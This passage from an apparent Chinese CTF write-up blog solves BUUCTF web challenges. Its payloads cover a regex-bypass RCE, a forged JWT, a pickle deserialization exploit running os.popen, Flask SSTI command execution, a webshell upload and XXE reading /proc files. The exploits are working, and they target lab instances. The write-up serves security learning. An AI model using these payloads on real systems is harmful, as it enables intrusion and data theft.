class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>用换行去过掉正则</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=&#123;%0a&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0a&#125;</span><br><span class="line">/?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里cat用绝对路径是因为代码开头的putenv改变了环境变量</p></blockquote><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>借鉴<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">p牛的PCRE</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b674a78d-a4b4-415f-be11-4c3c97552e20.node4.buuoj.cn:81&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;evo&quot;:&quot;&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get会报414 Request-URI Too Large</span></span><br><span class="line">response = requests.post(url=url,data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>点击查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>漏洞点在<code>basename</code>处，利用这里可以实现文件任意读，参考<a href="https://www.cnblogs.com/yesec/p/15429527.html">烨的博客</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/啊?source</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>查看源码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--这题脑洞确实有点大,所以我们留了些hint,请注意!--&gt;</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">&lt;!--ikun人肉并祭天了潜伏已久黑粉程序员,永远不要惹我们家kunkun!--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--但是这个黑粉头子好像留了很多漏洞,有没有好心人帮我们家kunkun找出漏洞?!--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;zhenai&quot;</span>&gt;</span>ikun们冲鸭,一定要买到lv6!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应该是要买<code>lv6</code>，写个脚本找一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6c7b4416-241f-4745-b73c-80387ced6729.node4.buuoj.cn:81/shop&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">params = &#123;</span><br><span class="line"><span class="string">&quot;page&quot;</span>:i</span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url=url,params=params)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="built_in">print</span>(i) <span class="comment">#181</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>在<code>181</code>页发现，也就是<code>/info/1624</code>，注册个帐号购买，发现直接买钱不够。观察下买别的商品发现存在<code>discount</code>，故直接修改折扣即可，注意一下要<code>POST</code>的是<code>shopcar</code>页面，发现提示</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/b1g_m4mber</span><br></pre></td></tr></table></figure><p>访问后提示只准<code>admin</code>访问，发现<code>jwt</code>字段，爆破一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.B-OZYHuG5HRg_eOm_FujDz6VVR6xpA1ENW4jZ5D4qxo</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br></pre></td></tr></table></figure><p>用<code>1kun</code>伪造一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure><p>源码发现</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br></pre></td></tr></table></figure><p>下载下来进行审计，在<code>Admin.py</code>中发现有<code>pickle.loads</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>没什么过滤，直接编写<code>exp</code>，注意是<code>python2</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment"># 也可以用&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># pickle.loads(urllib.unquote(a))</span></span><br></pre></td></tr></table></figure><p>打一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">become=c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>禁用了<code>globals</code>的<code>ssti</code>，拼接一下就好</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?search=&#123;&#123;().__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;%2b&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以看下源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, abort </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">&#x27;CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;&#x27;</span> </span><br><span class="line">result = [<span class="string">&quot;CCC&#123;Fl49_p@l5u&#125;&quot;</span>, <span class="string">&quot;CSC CTF 2019&quot;</span>, <span class="string">&quot;Welcome to CTF Bois&quot;</span>, <span class="string">&quot;CCC&#123;Qmu_T3rtyPuuuuuu&#125;&quot;</span>, <span class="string">&quot;Tralala_trilili&quot;</span>] </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(): </span><br><span class="line">    <span class="keyword">global</span> result </span><br><span class="line">    blacklist = [<span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;listdir&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>] </span><br><span class="line">    search = request.args.get(<span class="string">&#x27;search&#x27;</span>) <span class="keyword">or</span> <span class="literal">None</span> </span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">        <span class="keyword">for</span> black <span class="keyword">in</span> blacklist: </span><br><span class="line">            <span class="keyword">if</span> black <span class="keyword">in</span> search: </span><br><span class="line">                abort(<span class="number">500</span>) </span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> result: </span><br><span class="line">            result = search </span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/body&gt; &lt;/html&gt;&#x27;&#x27;&#x27;</span> % (search, result)) </span><br><span class="line">    <span class="keyword">elif</span> search == <span class="literal">None</span>: </span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt;&lt;br&gt; &lt;!-- Parameter Name: search --&gt; &lt;!-- Method: GET --&gt; &lt;/body&gt; &lt;/html&gt;&#x27;&#x27;&#x27;</span> % (search, result)) </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        result = [] </span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/body&gt; &lt;/html&gt;&#x27;&#x27;&#x27;</span> % (search, result)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p><code>ban</code>掉了<code>url_for</code>, <code>listdir</code>和<code>globals</code></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>注册个帐号进去点<code>上传</code>发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">exif_imagetype</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/profile.php on line <span class="number">76</span></span><br></pre></td></tr></table></figure><p>发现是<code>exif_imagetype</code>判断文件类型，并且对后缀没限制，直接加个<code>GIF89a</code>的头上传个🐎然后蚁剑连接即可</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>点击一下看到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>爆破随机数的<code>seed</code>，给了字符串<code>pZJjZcS0nS</code>，写个脚本转换下格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;pZJjZcS0nS&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">index = s1.find(i)</span><br><span class="line">res += <span class="built_in">str</span>(index) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27; &#x27;</span>+ <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(s1)-<span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 15 15 0 61 61 61 0 61 45 45 0 61 9 9 0 61 61 61 0 61 2 2 0 61 54 54 0 61 26 26 0 61 13 13 0 61 54 54 0 61</span></span><br></pre></td></tr></table></figure><p>使用<code>php_mt_seed</code>工具爆破下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">time ./php_mt_seed 15 15 0 61 61 61 0 61 45 45 0 61 9 9 0 61 61 61 0 61 2 2 0 61 54 54 0 61 26 26 0 61 13 13 0 61 54 54 0 61</span><br></pre></td></tr></table></figure><p>得到<code>653247404</code>，进行预测</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$seed</span> = <span class="number">653247404</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;<span class="comment">//pZJjZcS0nS4x8IE1GF2v</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>存在<code>xxe</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>185</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">evo1</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/net/fib_trie&quot;</span>&gt;</span> </span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span> </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="symbol">&amp;flag;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>c<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><blockquote><p>一些常用内网探测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/net/arp</span><br><span class="line">/etc/hosts</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br></pre></td></tr></table></figure></blockquote><p>发现<code>10.244.80.165</code>，爆破一下即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81/doLogin.php&quot;</span></span><br><span 